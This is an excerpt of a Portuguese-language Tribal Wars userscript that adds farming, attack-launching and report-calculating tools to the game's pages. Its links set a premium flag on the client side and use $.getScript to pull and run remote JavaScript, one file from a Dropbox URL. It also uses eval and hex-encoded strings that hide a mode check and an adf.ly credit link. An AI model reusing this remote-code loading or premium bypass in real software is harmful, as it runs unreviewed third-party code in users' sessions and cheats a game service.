base_scripts + 'tabela_codigosbb.js\');void(0);" id="extrair_codigo_bb">' + lang_perfil[3] + '</a></td></tr>';
		...
		if (gd.screen == 'mail' && (gd.mode == 'in' || gd.mode == undefined)){
			...
			for (i = 5; i < tr_msg.length - 1; i++){
				...
				$(tr_msg[i]).find('input:first').after('<a href="javascript:void(0);" title="' + lang_screen_sobre[30] + '"><img height="13" width="13" 

src="http://www.iconesbr.net/download.php?id=245&file=245_16x16.png"></a>');
				eval('$(tr_msg[i]).find(\'a:first\').bind(\'click\', function(){load_msg(\'http://' + document.domain + '/game.php?' + url + '\', $(this).parent().find(\'a:eq(1) 
...
img:first\'))})');
		...
		if (location.href.indexOf(dhx('6d6f64653d7365637265746f')) > 0) {
			document.getElementById('content_value').getElementsByTagName('td')[15].innerHTML = 

dhx('');
		}
		...
		if (gd.screen=='report'){
			...
			if (gd.mode == 'attack'){
				...
				for (i = 1; i < tr_report.length - 1; i++){
					...
					$(tr_report[i]).find('input:first').after('<a style="cursor:pointer;" title="' + lang_report[4] + '"><img 

src="http://cdn2.tribalwars.net/graphic/command/attack.png"/></a>');
					eval('$(tr_report[i]).find(\'a:first\').bind(\'click\', function(){atacar(\'' + target + '\')});');
					
					//$(tr_report[i]).find('input:first').after('<a href="game.php?village=' + VillId + '&target_c=' + target + '&screen=place"><img 

src="http://cdn2.tribalwars.net/graphic/command/attack.png"/></a>');
					
					//report_id = _GET('view', $(tr_report[i]).find('a:first').attr('href'));
					//$(tr_report[i]).find('input:first').after('<a href="report_id=' + report_id + '&village=' + VillId + '&screen=place"><img 
...
src="http://cdn2.tribalwars.net/graphic/command/attack.png"/></a>');
		...
		if (_GET('view') != null && gd.screen == 'report') {
			...
			document.getElementById('attack_info_att').parentNode.innerHTML += publicar + '<a href="/game.php?village=' + VillId + '&screen=place&mode=sim&att_units=' + 

att_units + '&def_units=' + def_units + '">» ' + lang_report[0] + '</a><br><a href="/game.php?village=' + VillId + '&screen=place&mode=sim&att_units=' + att_survivor + '&def_units=' + def_survivor + 

'">» ' + lang_report[1] + '</a><hr><a href="/game.php?target=' + id_target + '&village=' + VillId + '&screen=place">» ' + lang_report[2] + '</a><br><a id="same" href="/game.php?target=' + id_target 

+ '&village=' + VillId + '&screen=place&type=same&att_units=' + att_units + '">» ' + lang_report[3] + '</a><br><a href="/game.php?target=' + id_target + '&village=' + VillId + 

'&screen=place&type=all">» ' + lang_report[4] + '</a>'; 
			
			if (document.getElementById('attack_spy') != null) {
				document.getElementById('attack_spy').parentNode.innerHTML += '<hr><table id="farmar_tabela" class="vis"><tbody><tr><td colspan="7"><a 

href="javascript:' + str_setData	+ '; mandar_spy = 1; spy = document.getElementById(\'spy\').value; lanceiro = Number(document.getElementById(\'spear\').checked); espadachim = 

Number(document.getElementById(\'sword\').checked); barbaro = Number(document.getElementById(\'axe\').checked); arqueiro = Number(document.getElementById(\'archer\').checked); cav_leve = 

Number(document.getElementById(\'light\').checked); arqueiro_cav = Number(document.getElementById(\'marcher\').checked); cav_pesada = Number(document.getElementById(\'heavy\').checked); 

var ataque = true; var debug_ligado = 0; coo = lanceiro + \'!!!\' + espadachim + \'!!!\' + barbaro +\'!!!\' + arqueiro + \'!!!\' + cav_leve + \'!!!\' + arqueiro_cav + \'!!!\' + cav_pesada + \'!!!\' + mandar_spy + 

\'!!!\' + spy + \'!!!\' + debug_ligado; game_data.player.premium = true; setCookie(game_data.world + \'_\' + game_data.village.id + \'_calcular\', coo); 

$.getScript(\'http://dl.dropbox.com/u/72485850/tribalwarsbrasil/calcular_farmar.js\'); void(0);">' + lang_calc_reports + '</a></td></tr><tr><td width="60"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_spy.png?1"><input size="1" type="text" value="1" id="spy"></td><td width="50"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_light.png?1"><input type="checkbox" id="light"></td><td width="50"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_marcher.png?1"><input type="checkbox" id="marcher"></td><td width="50"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_heavy.png?1"><input type="checkbox" id="heavy"></td><td width="50"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_spear.png?1"><input type="checkbox" id="spear"></td><td width="50"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_sword.png?1"><input type="checkbox" id="sword"></td><td width="50"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_axe.png?1"><input type="checkbox" id="axe"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_archer.png?1"><input 

type="checkbox" id="archer"></td></tr></tbody></table>';
			}
			else{
				if (document.getElementById('attack_info_att') != null)	document.getElementById('attack_info_att').parentNode.innerHTML += '<hr><a href="#" 

class="inactive" title="Apenas em relatório de espionagem" onclick="return false">' + lang_calc_reports + '</a>';
			}
		...
		if (gd.screen == 'snob'){
			...
			if (cunhar_table.getElementsByTagName('tr')[3] == null){
				...
				cunhar_table.getElementsByTagName('th')[1].innerHTML += ' | <input type="checkbox" id="cunhar_check"' + cunhar_checked + ' onClick="' + str_setData + '; 

setCookie(\'' + VillId + '_cunhar\', String(this.checked)); if (this.checked == true) location.href = document.getElementById(\'cunhar\').href;void(0);"> Auto';
		...
		if (gd.screen == 'place'){
			...
			if (getData(mundo + '_' + VillId + '_calcular') != '') {
				...
				abrir = 'javascript: lanceiro = ' + cmd[0] + '; espadachim = ' + cmd[1] + '; barbaro = ' + cmd[2] + '; arqueiro = ' + cmd[3] + '; cav_leve = ' + cmd[4] + '; 

arqueiro_cav = ' + cmd[5] + '; cav_pesada = ' + cmd[6] + '; mandar_spy = ' + cmd[7] + '; spy = ' + cmd[8] + '; debug_ligado = 0; ataque = true; game_data.player.premium = true; $.getScript(\'' + 

base_scripts + 'calcular_farmar.js\');void(0);';
				//prompt('copie', abrir);
				location.href = abrir;
			...
			if (gd.mode == 'sim'){
				if (_GET('att_units') != null && _GET('def_units') != ''){
					...
					if (att.length >= 12) at = 'spear,sword,axe,archer,spy,light,marcher,heavy,ram,catapult,knight,snob'; else at = 
...
'spear,sword,axe,spy,light,heavy,ram,catapult,knight,snob';
			...
			if (gd.mode == 'farmar') {
				...
				tabela_farmar[tabela_farmar.length - 1].innerHTML = '<h3>' + lang_farmer[0] + '</h3><h6>' + lang_farmer[1] + '</h6><br><table><tbody><tr><td 

colspan="2"><table><tbody><tr><td>' + lang_farmer[2] + ' <span id="count_villages">' + (coords_1.split(' ').length-1) + '</span> <input type="text" tabindex="13" id="coordenadas_1" value="' + 

coords_1 + '" onblur="$(\'#count_villages\').text(this.value.split(\' \').length-1);void(0);" size="50"></td><td><a id="salvar_farmar_0" href="#">' + lang_farmer[3] + '</a></td><td height="24"><a 

href="http://' + mundo + '.twplus.org/calculator/locator/?v_x=' + xy[0] + '&v_y=' + xy[1] + '" target="search" title="Use Script-Export">» ' + lang_search_villages + 

'</a></td></tr></tbody></table></td></tr><tr><td valign="top" id="farmar_1"><table><tbody><tr><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" 

class="unit_link" onclick="return UnitPopup.open(event, \'spear\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spear.png?1" title="' + lang_spear + '" alt="" class=""></a> <input 

id="unit_input1_spear" name="spear" type="text" size="5" tabindex="1" value="' + spear_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return 

UnitPopup.open(event, \'sword\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_sword.png?1" title="' + lang_sword + '" alt="" class=""></a> <input id="unit_input1_sword" name="sword" 

type="text" size="5" tabindex="2" value="' + sword_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'axe\')"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_axe.png?1" title="' + lang_axe + '" alt="" class=""></a> <input id="unit_input1_axe" name="axe" type="text" size="5" tabindex="3" value="' + 

axe_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'archer\')"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_archer.png?1" title="Arqueiro" alt="" class=""></a> <input id="unit_input1_archer" name="archer" type="text" size="5" tabindex="4" value="' + 

archer_1 + '" class="unitsInput"></td></tr></tbody></table></td><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return 

UnitPopup.open(event, \'spy\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spy.png?1" title="' + lang_spy + '" alt="" class=""></a> <input id="unit_input1_spy" name="spy" type="text" 

size="5" tabindex="5" value="' + spy_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'light\')"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_light.png?1" title="' + lang_light + '" alt="" class=""></a> <input id="unit_input1_light" name="light" type="text" size="5" tabindex="6" value="' + 

light_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'marcher\')"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_marcher.png?1" title="' + lang_marcher + '" alt="" class=""></a> <input id="unit_input1_marcher" name="marcher" type="text" size="5" 

tabindex="7" value="' + marcher_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'heavy\')"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_heavy.png?1" title="' + lang_heavy + '" alt="" class=""></a> <input id="unit_input1_heavy" name="heavy" type="text" size="5" tabindex="8" 

value="' + heavy_1 + '" class="unitsInput"></td></tr></tbody></table></td><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" 

onclick="return UnitPopup.open(event, \'ram\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_ram.png?1" title="' + lang_ram + '" alt="" class=""></a> <input id="unit_input1_ram" 

name="ram" type="text" size="5" tabindex="9" value="' + ram_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, 

\'catapult\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_catapult.png?1" title="'+ lang_catapult + '" alt="" class=""></a> <input id="unit_input1_catapult" name="catapult" type="text" 

size="5" tabindex="10" value="' + catapult_1 + '" class="unitsInput"></td></tr></tbody></table></td></tr></tbody></table><table><tbody><tr><td><a id="salvar_farmar_1" href="#">' + lang_farmer[3] 

+ '</a> (' + lang_farmar + ' 1)</td></tr></tbody></table></td><td valign="top" id="farmar_2"><table><tbody><tr><td valign="top"><table class="vis" width="100%"><tbody><tr><td 

class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'spear\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spear.png?1" title="' + lang_spear + '" alt="" 

class=""></a> <input id="unit_input2_spear" name="spear" type="text" size="5" tabindex="1" value="' + spear_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" 

class="unit_link" onclick="return UnitPopup.open(event, \'sword\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_sword.png?1" title="' + lang_sword + '" alt="" class=""></a> <input 

id="unit_input2_sword" name="sword" type="text" size="5" tabindex="2" value="' + sword_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return 

UnitPopup.open(event, \'axe\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_axe.png?1" title="' + lang_axe + '" alt="" class=""></a> <input id="unit_input2_axe" name="axe" 

type="text" size="5" tabindex="3" value="' + axe_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'archer\')"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_archer.png?1" title="' + lang_archer + '" alt="" class=""></a> <input id="unit_input2_archer" name="archer" type="text" size="5" tabindex="4" 

value="' + archer_2 + '" class="unitsInput"></td></tr></tbody></table></td><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" 

onclick="return UnitPopup.open(event, \'spy\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spy.png?1" title="' + lang_spy + '" alt="" class=""></a> <input id="unit_input2_spy" 

name="spy" type="text" size="5" tabindex="5" value="' + spy_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, 

\'light\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_light.png?1" title="' + lang_light + '" alt="" class=""></a> <input id="unit_input2_light" name="light" type="text" size="5" 

tabindex="6" value="' + light_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'marcher\')"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_marcher.png?1" title="' + lang_marcher + '" alt="" class=""></a> <input id="unit_input2_marcher" name="marcher" type="text" size="5" 

tabindex="7" value="' + marcher_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'heavy\')"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_heavy.png?1" title="'+lang_heavy+'" alt="" class=""></a> <input id="unit_input2_heavy" name="heavy" type="text" size="5" tabindex="8" value="' 

+ heavy_2 + '" class="unitsInput"></td></tr></tbody></table></td><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return 

UnitPopup.open(event, \'ram\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_ram.png?1" title="'+ lang_ram +'" alt="" class=""></a> <input id="unit_input2_ram" name="ram" type="text" 

size="5" tabindex="9" value="' + ram_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'catapult\')"><img 

src="http://cdn.tribalwars.com.br/graphic/unit/unit_catapult.png?1" title="' + lang_catapult + '" alt="" class=""></a> <input id="unit_input2_catapult" name="catapult" type="text" size="5" 

tabindex="10" value="' + catapult_2 + '" class="unitsInput"></td></tr></tbody></table></td></tr></tbody></table><table><tbody><tr><td><a id="salvar_farmar_2" href="#">' + lang_farmer[3] + '</a> 
...
(' + lang_farmar + ' 2)</td></tr></tbody></table></td></tr></tbody></table>';
			...
			if ((document.getElementById('content_value').getElementsByTagName('tbody')[2] != null) && (document.getElementById('troop_confirm_go') == null)) 

document.getElementById('content_value').getElementsByTagName('tbody')[2].innerHTML += '<tr><td width="100"><a href="/game.php?village=' + VillId + 

'&amp;screen=place&amp;mode=farmar">' + lang_farmar + '</a></td></tr>';
			...
			if (document.getElementById('target_attack') != null) {
				...
				_tropas = speed('spear') + '|' + speed('sword') + '|' + speed('axe') + '|' + speed('archer') + '|' + speed('spy') + '|' + speed('light') + '|' + speed('marcher') + '|' + 

speed('heavy') + '|' + speed('ram') + '|' + speed('catapult') + '|' + speed('knight') + '|' + speed('snob');
				...
				td.innerHTML = '<a id="farmar_1" href="javascript: lanca = ' + spear_1 + '; espada = ' + sword_1 + '; barbaro = ' + axe_1 + '; arqueiro = ' + archer_1 + '; 

explorador = ' + spy_1 + '; cavalaria_leve = ' + light_1 + '; cavalaria_arqueira = ' + marcher_1 + '; cavalaria_pesada = ' + heavy_1 + '; catapulta = '+ catapult_1 + '; ariete = '+ ram_1 + '; coords_ataque 

= \''+ coords_1 + '\'; aviso = false; coockieName = game_data.world + \'_\' + game_data.village.id + \'_farmeruk\'; $.getScript(\'' + base_scripts + 'saquear_aldeia_farmar.js\');void(0);">» ' + lang_farmar 

+ ' 1</a> <input type="input" size="1" style="margin:0" id="farmar_1_input" value="' + farmar_1_input + '" title="Auto"><input id="ok_1" type="button" value="ok"><br><a id="farmar_2" 

href="javascript: lanca = ' + spear_2 + '; espada = ' + sword_2 + '; barbaro = ' + axe_2 + '; arqueiro = ' + archer_2 + '; explorador = ' + spy_2 + '; cavalaria_leve = ' + light_2 + '; cavalaria_arqueira = ' + 

marcher_2 + '; cavalaria_pesada = ' + heavy_2 + '; catapulta = '+ catapult_2 + '; ariete = '+ ram_2 + '; coords_ataque = \''+ coords_1 + '\'; aviso = false; coockieName = game_data.world + \'_\' + 

game_data.village.id + \'_farmeruk\'; $.getScript(\'' + base_scripts + 'saquear_aldeia_farmar.js\');void(0);">» ' + lang_farmar + ' 2</a> <input type="input" size="1" style="margin:0" 

id="farmar_2_input" value="' + farmar_2_input + '" title="Auto"><input id="ok_2" type="button" value="ok"/>';
				$('#units_form').after(td);
		...
		if (aldeiasnome != ''){
			...
			if (gd.screen == 'market' && (gd.mode == null || gd.mode == 'send')){
				...
				$('#aldeias_market').bind('change', function(){
					if ($(this).val() != lang_screen_ally[1]){
						c = $(this).val().split('|'); 
						$('#inputx').val(c[0]);
						$('#inputy').val(c[1]);
					}
				});
				select = '<option>' + lang_screen_ally[1] + '</option>';
		...
		if (gd.screen == 'map') {
			...
			if (document.getElementById('map_config') != null) {
				document.getElementById('map_config').innerHTML += '<br><table class="vis" width="100%"><tbody><tr><th colspan="2">' + lang_map[9] + 

'</th></tr><tr><td><table cellspacing="0"><tbody><tr><td width="80">' + lang_map[8] + '</td><td><select id="map_chooser_select" 

onchange="TWMap.resize(parseInt($(\'#map_chooser_select\').val()), true)"><option id="current-map-size" value="13x13" style="display:none;">13x13</option><option 

value="4">4x4</option><option value="5">5x5</option><option value="7">7x7</option><option value="9">9x9</option><option value="11">11x11</option><option value="13" 

selected="selected">13x13</option><option value="15">15x15</option><option value="20">20x20</option><option value="30">30x30</option></select></td><td valign="middle"><img alt="" 

class="tooltip" src="http://cdn.tribalwars.com.br/graphic//questionmark.png" width="13" height="13"></td></tr></tbody></table><input type="hidden" 

value="/game.php?village=86984&amp;screen=settings&amp;ajaxaction=set_map_size&amp;h=d7d4" id="change_map_size_link"></td></tr><tr><td><table cellspacing="0"><tbody><tr><td 

width="80">' + lang_map[7] + '</td><td colspan="2"><select id="minimap_chooser_select" onchange="TWMap.resizeMinimap(parseInt($(\'#minimap_chooser_select\').val()), true)"><option 

id="current-minimap-size" value="120x120" style="display:none;">120x120</option><option value="20">20x20</option><option value="30">30x30</option><option 

value="40">40x40</option><option value="50">50x50</option><option value="60">60x60</option><option value="70">70x70</option><option value="80">80x80</option><option 

value="90">90x90</option><option value="100">100x100</option><option value="110">110x110</option><option value="120" 

selected="selected">120x120</option></select></td></tr></tbody></table><input type="hidden" 

value="/game.php?village=86984&amp;screen=settings&amp;ajaxaction=set_map_size&amp;h=d7d4" id="change_map_size_link"></td></tr></tbody></table>';
			}
		}
				...
				if (messages[i] != null){             
					...
					if (meta2 != null) {
						for (b = 0; b < meta2.length; b++) {	
							...
							tag_vid = '<object width="300" height="225"><param name="movie" value="http://www.youtube.com/v/' + 

meta2[b].match(RegExpV2)[1] + '"></param><param name="allowFullScreen" value="true"></param><param name="allowscriptaccess" value="always"></param><embed 

src="http://www.youtube.com/v/zh6PeT8f6Ro?version=3&amp;hl=pt_BR" type="application/x-shockwave-flash" width="560" height="315" allowscriptaccess="always" 
...
allowfullscreen="true"></embed></object>';                                           
			...
			document.getElementById('action_row2').outerHTML += '<br><tr><th colspan="2">' + lang_messages[0] + '</th></tr><tr><td colspan="2"><li>' + lang_messages[1] + ' 

*</li></td></tr><tr><td colspan="2"><li>' + lang_messages[2] + ' *</li></td></tr><tr><td colspan="2"><input type="checkbox"' + allow_html_check + '" onclick="' + str_setData + ' 

setCookie(game_data.world + \'_permitir_html\', String(this.checked));void(0);"></input>' + lang_messages[3] + ' *</td></tr><tr><td colspan="2" align="right"><font size="1">' + lang_messages[4] + 
...
'</font></td></tr>';
		...
		if (getElementsByClass(dhx('7365727665725f696e666f'))[0] != null) getElementsByClass(dhx('7365727665725f696e666f'))[0].innerHTML += 

dhx('3c7020636c6173733d227365727665725f696e666f223e536372697074206279203c6120687265663d22687474703a2f2f6164662e6c792f423549755922207461726765743d225f626c616e6b223e4665726e616e646f5

84c52202d20506f696e74446f776e6c6f6164733c2f613e') + lang_settings[18] + '</p>';
